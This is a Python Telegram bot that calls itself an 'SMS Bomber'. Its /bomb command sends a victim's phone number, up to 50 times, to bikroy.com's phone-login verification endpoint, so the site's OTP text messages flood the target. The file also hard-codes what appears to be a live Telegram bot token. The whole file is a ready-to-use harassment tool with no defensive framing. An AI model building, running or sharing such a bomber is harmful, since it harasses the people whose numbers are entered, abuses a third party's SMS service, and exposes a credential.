import requests
import logging
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# Configure logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('🚀 SMS Bomber Bot\n\nSend me a phone number with country code to start bombing!\nExample: /bomb +8801234567890')

def bomb(update: Update, context: CallbackContext) -> None:
    if len(context.args) < 1:
        update.message.reply_text('⚠️ Please provide a phone number with country code\nExample: /bomb +8801234567890')
        return

    phone_number = context.args[0]
    if not phone_number.startswith('+'):
        update.message.reply_text('⚠️ Please include country code (e.g. +880 for Bangladesh)')
        return

    try:
        count = int(context.args[1]) if len(context.args) > 1 else 10
        count = min(count, 50)  # Limit to prevent abuse
    except ValueError:
        update.message.reply_text('⚠️ Invalid count specified. Using default (10)')
        count = 10

    update.message.reply_text(f'💣 Starting SMS bombing to {phone_number} ({count} messages)...')

    success = 0
    for i in range(count):
        try:
            response = requests.get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone_number}')
            if response.status_code == 200:
                success += 1
        except Exception as e:
            logger.error(f"Error sending SMS: {e}")

    update.message.reply_text(f'✅ Done! Successfully sent {success} SMS to {phone_number}')

def main() -> None:
    updater = Updater("7967640685:AAEZ7fuuqd_GAnHyAMWe7ro9UvX88j6JICM", use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("bomb", bomb, pass_args=True))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
